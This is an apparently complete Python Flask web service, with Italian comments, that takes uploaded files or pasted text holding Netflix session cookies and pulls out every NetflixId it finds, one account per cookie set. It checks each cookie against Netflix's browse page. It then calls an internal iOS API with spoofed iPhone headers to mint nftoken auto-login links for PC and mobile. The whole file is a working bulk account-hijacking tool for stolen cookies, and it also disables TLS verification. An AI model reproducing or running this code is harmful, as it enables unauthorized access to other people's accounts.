"""
Netflix NFToken Web — Flask su Railway
Scansiona file/testo, trova tutti i set di cookie, genera link PC + Mobile per ognuno.
"""

import os
import re
import json
import urllib.parse
import logging
import requests
from flask import Flask, request, jsonify, send_from_directory
from urllib3.exceptions import InsecureRequestWarning

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

app = Flask(__name__, static_folder="static")

_TOKEN_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"}
_REQUIRED    = {"NetflixId"}
_HTTPONLY    = re.compile(r"^#HttpOnly_", re.IGNORECASE)
_COMMENT     = re.compile(r"^\s*#")

_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}

_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


# ── Cookie parsing ─────────────────────────────────────────────────────────────

def _decode(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def _parse_netscape_block(lines):
    """Parse one block of Netscape lines → dict of cookie name→value."""
    found = {}
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if _HTTPONLY.match(line):
            line = _HTTPONLY.sub("", line)
        elif _COMMENT.match(line):
            continue
        parts = line.split("\t")
        if len(parts) != 7:
            parts = re.split(r"  +", line)
        if len(parts) != 7:
            continue
        _, _f, _p, _s, _e, name, value = parts
        name = name.strip(); value = value.strip()
        if name in _TOKEN_NAMES and len(value) > 5:
            found[name] = _decode(value)
    return found


def extract_all_cookie_sets(raw):
    """
    Scan raw content and extract ALL distinct cookie sets.
    Handles:
    - Multiple Netscape blocks in one file (split by blank lines or repeated domains)
    - JSON array of cookie objects
    - JSON dict
    - Raw browser strings (name=value; ...)
    - Mixed content (files with other text + cookies inside)
    Returns list of dicts, each with at least NetflixId.
    """
    sets = []

    # Try JSON
    try:
        data = json.loads(raw)
        if isinstance(data, list):
            # Could be array of cookie objects OR array of accounts
            cookies = {c["name"]: _decode(c["value"]) for c in data
                       if isinstance(c, dict) and c.get("name") in _TOKEN_NAMES}
            if "NetflixId" in cookies:
                sets.append(cookies)
        elif isinstance(data, dict):
            cookies = {k: _decode(v) for k, v in data.items() if k in _TOKEN_NAMES}
            if "NetflixId" in cookies:
                sets.append(cookies)
        if sets:
            return sets
    except Exception:
        pass

    # Netscape / mixed text — find all NetflixId occurrences
    # Split into blocks wherever we see a new NetflixId line
    # Each NetflixId starts a new account
    lines = raw.splitlines()

    current = {}
    for line in lines:
        stripped = line.strip()

        # Strip HttpOnly prefix
        if _HTTPONLY.match(stripped):
            stripped = _HTTPONLY.sub("", stripped)

        # Skip pure comments (but not httponly ones we just fixed)
        if _COMMENT.match(stripped) and not stripped.startswith(".") and "\t" not in stripped:
            continue

        parts = stripped.split("\t")
        if len(parts) != 7:
            parts = re.split(r"  +", stripped)
        if len(parts) != 7:
            # Not a Netscape line — check if raw cookie string segment
            for pair in stripped.split(";"):
                pair = pair.strip()
                if "=" not in pair:
                    continue
                name, _, value = pair.partition("=")
                name = name.strip(); value = value.strip()
                if name == "NetflixId":
                    # New account in raw string — save current if valid
                    if "NetflixId" in current:
                        sets.append(current)
                    current = {"NetflixId": _decode(value)}
                elif name in _TOKEN_NAMES and len(value) > 5:
                    current[name] = _decode(value)
            continue

        _, _f, _p, _s, _e, name, value = parts
        name = name.strip(); value = value.strip()

        if name not in _TOKEN_NAMES or len(value) <= 5:
            continue

        if name == "NetflixId" and "NetflixId" in current:
            # New account — save previous
            sets.append(current)
            current = {}

        current[name] = _decode(value)

    # Save last block
    if "NetflixId" in current:
        sets.append(current)

    # Also scan for raw inline NetflixId=xxx patterns (email/mixed files)
    inline = re.findall(r"NetflixId=([^\s;,\"']+)", raw)
    existing_ids = {s.get("NetflixId", "") for s in sets}
    for val in inline:
        decoded = _decode(val)
        if decoded not in existing_ids and len(decoded) > 20:
            sets.append({"NetflixId": decoded})
            existing_ids.add(decoded)

    return sets


# ── Token generation ───────────────────────────────────────────────────────────

def generate_nftoken(cookies):
    netflix_id = cookies.get("NetflixId")
    if not netflix_id:
        raise RuntimeError("NetflixId non trovato.")

    headers = dict(_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    r = requests.get(
        _API_URL, params=_QUERY_PARAMS, headers=headers,
        timeout=30, verify=False,
    )
    r.raise_for_status()

    data = r.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    if not token:
        raise RuntimeError(f"Nessun token: {json.dumps(data)[:200]}")

    return "https://netflix.com/?nftoken=" + token


_VERIFY_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/124.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}


def verify_web_cookies(netflix_id: str) -> bool:
    """
    Verifica che il cookie NetflixId sia ancora valido per il login WEB.

    Strategia: visita /browse direttamente (pagina protetta).
    - Cookie valido  → Netflix risponde 200 su /browse
    - Cookie scaduto → Netflix fa 302 server-side verso /login
    Nessun JavaScript coinvolto — redirect puro HTTP.

    Facciamo questo PRIMA di generare il token così non consumiamo
    il token durante la verifica (i nftoken hanno vita molto corta).
    """
    try:
        r = requests.get(
            "https://www.netflix.com/browse",
            cookies={"NetflixId": netflix_id},
            headers=_VERIFY_HEADERS,
            timeout=15,
            verify=False,
            allow_redirects=True,
        )
        final = r.url.lower()
        # Cookie scaduto → redirect a login/signup
        if "/login" in final or "/signup" in final or "/register" in final:
            return False
        # Siamo rimasti su browse o profili → cookie valido
        return True
    except Exception as exc:
        log.warning("verify_web_cookies fallita: %s", exc)
        # In caso di errore di rete assumiamo valido per non scartare troppo
        return True


# ── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return send_from_directory("static", "index.html")


@app.route("/<path:filename>")
def static_files(filename):
    """Serve qualsiasi file dalla cartella static (es. /app.js, /style.css)."""
    return send_from_directory("static", filename)


@app.route("/api/generate", methods=["POST"])
def api_generate():
    data = request.get_json(silent=True) or {}
    raw  = data.get("cookie", "").strip()

    if not raw:
        f = request.files.get("file")
        if f:
            raw = f.read().decode("utf-8", errors="replace")

    if not raw:
        return jsonify({"error": "Nessun cookie fornito."}), 400

    cookie_sets = extract_all_cookie_sets(raw)
    if not cookie_sets:
        return jsonify({"error": "Nessun NetflixId trovato nel contenuto."}), 400

    accounts = []
    for cookies in cookie_sets:
        netflix_id = cookies.get("NetflixId", "")
        try:
            # Step 1: verifica cookie web PRIMA di generare il token
            # così non consumiamo un token su cookie già scaduti
            if not verify_web_cookies(netflix_id):
                log.info("Cookie web scaduti per NetflixId ...%s, scartato.", netflix_id[-6:])
                continue

            # Step 2: genera il token (solo se i cookie sono validi)
            url = generate_nftoken(cookies)
            token_part = url.split("?nftoken=")[1]
            mobile_url = "https://www.netflix.com/unsupported?nftoken=" + token_part
            accounts.append({"url": url, "mobile_url": mobile_url})

        except Exception as e:
            log.warning("Cookie set failed: %s", e)
            continue

    if not accounts:
        return jsonify({"error": "Cookie trovati ma tutti non validi o scaduti."}), 400

    return jsonify({"accounts": accounts})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
